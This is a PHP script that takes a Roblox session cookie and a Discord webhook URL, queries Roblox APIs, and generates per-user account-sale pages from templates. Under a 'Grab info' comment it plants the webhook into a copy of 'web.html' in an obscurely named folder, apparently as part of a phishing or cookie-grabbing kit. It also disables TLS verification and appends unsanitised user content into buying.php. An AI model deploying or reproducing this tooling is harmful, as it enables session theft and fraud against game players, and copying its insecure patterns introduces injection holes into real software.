<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<?php
//working fetch user input
$input2 = $_POST["pass"];
$input7 = $_POST["userp"];
$input3 = $_POST["price"];
$input4 = $_POST["description"];
$input5 = $_POST["paymentinfo"];
$input6 = $_POST["link"];
$input7 = $_POST["webhook"];

$string = "$input4";
if (preg_match('/[\'^£$%&*()}{@#~?><>,|=_+¬-]/', $string)) {
    die("Error: No Special Characters");
}
?>
<?php
$word     = "https://discord.com/api/webhooks";
$mystring = "$input7";

if (strpos($mystring, $word) !== false) {
    echo "Word Found!";
} else {
    die("Enter a Valid webhook");
}
?>
<?php
$url  = "https://www.roblox.com/mobileapi/userinfo";
$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
$headers = array(
    "Accept: application/json",
    "Cookie: .ROBLOSECURITY=$input2"
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
$resp = curl_exec($curl);
curl_close($curl);
$json = fopen("basic.json", "w") or die("Unable to open file!");
$txt1 = "$resp";
fwrite($json, $txt1);
fclose($json);
?>
<?php
$homepage   = file_get_contents("basic.json");
$jsonString = $homepage;
$data1      = json_decode($jsonString);
$data1->UserName;
?>
<?php
$filename = "Users/$data1->UserName.html";
if (file_exists($filename)) {
    If (unlink("basic.json")) {
    } else {
        echo "error";
    }
    die("Error: Looks like you already registered this account");
} else {
    echo "Making...";
}
?>
<?php
$myfile = fopen("$data1->UserName.html", "w")?>
<?php
$source = 'template.html';
$dest   = "Users/$data1->UserName.html";
copy($source, $dest);
?>
<?php
$path_to_file  = "Users/$data1->UserName.html";
$file_contents = file_get_contents($path_to_file);
$file_contents = str_replace("name1", "$data1->UserName", $file_contents);
file_put_contents($path_to_file, $file_contents);
?>
<?php
$url  = "https://inventory.roblox.com/v1/users/$data1->UserID/assets/collectibles?sortOrder=Asc&limit=100";
$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
$resp = curl_exec($curl);
curl_close($curl);
var_dump($resp);
$responseJson  = "$resp";
$responseArr   = json_decode($responseJson, true);
$add           = array_sum(array_column($responseArr['data'], 'recentAveragePrice'));
$path_to_file  = "Users/$data1->UserName.html";
$file_contents = file_get_contents($path_to_file);
$file_contents = str_replace("rap2", "$add", $file_contents);
file_put_contents($path_to_file, $file_contents);
?>
<?php
$url  = "https://premiumfeatures.roblox.com/v1/users/$data1->UserID/validate-membership";
$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
$headers = array(
    "Cookie: .ROBLOSECURITY=$input2"
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
$resp = curl_exec($curl);
curl_close($curl);
var_dump($resp);
$path_to_file  = "Users/$data1->UserName.html";
$file_contents = file_get_contents($path_to_file);
$file_contents = str_replace("perminfo", "$resp", $file_contents);
file_put_contents($path_to_file, $file_contents);
?>
<?php
$path_to_file  = "Users/$data1->UserName.html";
$file_contents = file_get_contents($path_to_file);
$file_contents = str_replace("payico", "$input5", $file_contents);
file_put_contents($path_to_file, $file_contents);
?>
<?php
$path_to_file  = "Webhook/$data1->UserName.html";
$file_contents = file_get_contents($path_to_file);
$file_contents = str_replace("webhook", "$input7", $file_contents);
file_put_contents($path_to_file, $file_contents);
?>
<?php
$path_to_file  = "Users/$data1->UserName.html";
$file_contents = file_get_contents($path_to_file);
$file_contents = str_replace("dec", "$input4", $file_contents);
file_put_contents($path_to_file, $file_contents);
?>
<?php
$path_to_file  = "Users/$data1->UserName.html";
$file_contents = file_get_contents($path_to_file);
$file_contents = str_replace("payment1", "$input5", $file_contents);
file_put_contents($path_to_file, $file_contents);
?>
<?php
$path_to_file  = "Users/$data1->UserName.html";
$file_contents = file_get_contents($path_to_file);
$file_contents = str_replace("price1", "$input3", $file_contents);
file_put_contents($path_to_file, $file_contents);
?>
<?php
$path_to_file  = "Users/$data1->UserName.html";
$file_contents = file_get_contents($path_to_file);
$file_contents = str_replace("YOURBUYINGLINK", "$input6", $file_contents);
file_put_contents($path_to_file, $file_contents);
?>
<?php
If (unlink("$data1->UserName.html")) {
} else {
    echo "error";
}
?>
<?php
If (unlink("basic.json")) {
} else {
    echo "error";
}
?>
<?php
$path_to_file  = "Users/$data1->UserName.html";
$file_contents = file_get_contents($path_to_file);
$file_contents = str_replace("img3", "$data1->ThumbnailUrl", $file_contents);
file_put_contents($path_to_file, $file_contents);
?>
<?php
$path_to_file  = "Users/$data1->UserName.html";
$file_contents = file_get_contents($path_to_file);
$file_contents = str_replace("<script>", "", $file_contents);
file_put_contents($path_to_file, $file_contents);
?>
<?php
$new = file_get_contents("Users/$data1->UserName.html");
$fp  = fopen('buying.php', 'a'); //opens file in append mode  
fwrite($fp, "$new");
fclose($fp);
echo "File appended successfully...";
?> 
<!--Clear user info-->
<!--Grab info-->
<?php
$myfile = fopen("$data1->UserName.html", "w") or die("Unable to open file!");
$source = 'web.html';
$dest   = "webho3422i394h9u23h4uih4iuok/$data1->UserName.html";
copy($source, $dest);
?>
<?php
$path_to_file  = "webho3422i394h9u23h4uih4iuok/$data1->UserName.html";
$file_contents = file_get_contents($path_to_file);
$file_contents = str_replace("webhook", "$input7", $file_contents);
file_put_contents($path_to_file, $file_contents);
If (unlink("$data1->UserName.html")) {
} else {
    echo "error";
}
?>
<?php
If (unlink("basic.json")) {
} else {
    echo "error";
}
?>
<!--PASSWORD NEED-->
<meta http-equiv="Refresh" content="0; url='readme.php'" />